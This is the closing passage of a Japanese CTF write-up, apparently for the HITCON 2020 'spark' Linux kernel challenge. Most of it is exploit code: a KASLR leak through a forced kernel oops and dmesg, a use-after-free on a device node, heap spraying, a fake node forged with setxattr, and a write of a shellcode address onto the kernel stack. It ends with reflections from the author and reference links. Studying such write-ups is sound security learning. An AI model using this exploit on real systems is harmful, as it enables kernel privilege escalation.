  fs, &lk_regs.sp, &lk_regs.flags,  fs, &lk_regs.ax, &lk_regs.bx, &lk_regs.cx, \
  fs, &lk_regs.dx, &lk_regs.si, &lk_regs.di,  fs, &lk_regs.bp, &lk_regs.r8, &lk_regs.r9, \
  fs, &lk_regs.r10, &lk_regs.r11, &lk_regs.r12,  fs, &lk_regs.r13, &lk_regs.r14, &lk_regs.r15);
  fclose(fp);
  print_regs(&lk_regs);
}

void forge_fake_node(struct node_struct *fake_node, ulong finalized_idx){
  fake_node->index = 0xdeadbeef;
  fake_node->refcnt = 0xdeadbeef;
  fake_node->is_finalized = 1;    // prevent deeper traversal.
  fake_node->num_edge = 0;
  fake_node->prev_edge = NULL;
  fake_node->next_edge = NULL;
  fake_node->finalized_idx = finalized_idx;
  fake_node->info = NULL;
  memset(&fake_node->mutex_nb, '\x00', 0x20);
  memset(&fake_node->mutex_state, '\x00', 0x20);
}

#define ALLOC_KMALLOC_128(NUM) for(int i=0; i<NUM; ++i) open(DEV_PATH, O_RDWR);

int main(int argc, char *argv[]) {
  if(argc == 2){
    // invoke #GPF and Oops in the child and leak KASLR via dmesg
    // FYI: dmesg is restricted to adm group on the latest Ubuntu by default.
    // cf: https://www.phoronix.com/scan.php?page=news_item&px=Ubuntu-20.10-Restrict-dmesg
    invoke_gpf();
    exit(0);    // unreachable
  }else{
    const char *cmd = malloc(0x100);
    sprintf(cmd, "%s gpf", argv[0]);
    system(cmd); // cause #GPF
    leak_kaslr();
  }

  for(int i = 0; i < N; i++) {
    fd[i] = open(DEV_PATH, O_RDWR);
    assert(fd[i]);
  }

  // distance array became the size of 0x80
  _link(fd[1], fd[3], 0x1);       // fd[2] is used to retrieve the very heap leaked by R11
  for(int ix=3; ix<0x11; ++ix){
    _link(fd[ix], fd[ix+1], 0x1);
  }
  _link(fd[0], fd[1], (ulong)shellcode + 8);     // this link should be at the very last
  close(fd[0]);   // vuln

  // forge fake node
  ulong write_target = lk_regs.sp - spark_graph_query_stack_offset;
  forge_fake_node(&fake_node0,(write_target - lk_regs.r11) / sizeof(ulong));
  ALLOC_KMALLOC_128(0x12);

  // retrieve fd[0]'s node(private_data)
  setxattr("/home/spark", "NIRUGIRI", &fake_node0, sizeof(fake_node0), XATTR_CREATE);
  close(fd[2]);       // retrieve the very heap leaked by R11 when #GPF.
  _finalize(fd[1]);
  // now, node1.info->nodes are... node1 -> node3 -> node4 -> node5 -> ... -> node0x11 (0x10)

  _query(fd[1], fd[1], fd[9]);
  // distance array (8*0x10) is kmalloced.
  // first, node1 is checked and distance[0] = -1.
  // then,  node0 is checked and distance[target] = shellcode.

  NIRUGIRI();
  return 0;
}
```

# アウトロ
![](https://i.imgur.com/OYMkXTz.png)

書いてしまえば単純だけど、デバフォなしでデバッグするのはだいぶしんどかったです。多分kernelのproからすれば初歩も初歩の話なんだろうけど、今までやんわりとで使ってきたスラブアロケタについて改めてコードベースで調べてデバッグできたのは今後役に立つと嬉しいねって近所の羊が言っておりました。
最近はCTFのモチベが低下していることもあり、なにか目標を決めて問題を解いて行こうと思っています。kernel強化月間のため何か良い感じのkernel問題集ないかなぁと思っていたら、[hamaさんのブログ](https://hama.hatenadiary.jp/entry/2018/12/01/000000)に良さげなkernel(+qemu)の問題リストがあったため、これをぼちぼち解いていこうと思います。

ここまで書いてきましたが、プイプイモルカーって、なんですか？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？


# 参考
【A】スラブアロケタのいつ見ても素晴らしい日本語資料
https://kernhack.hatenablog.com/entry/2019/05/10/001425
【B】完全に参考にしたPoC
https://github.com/c0m0r1/CTF-Writeup/blob/master/hitcon2020/spark/exploit.c
【Z】ニルギリ
https://www.youtube.com/watch?v=yvUvamhYPHw

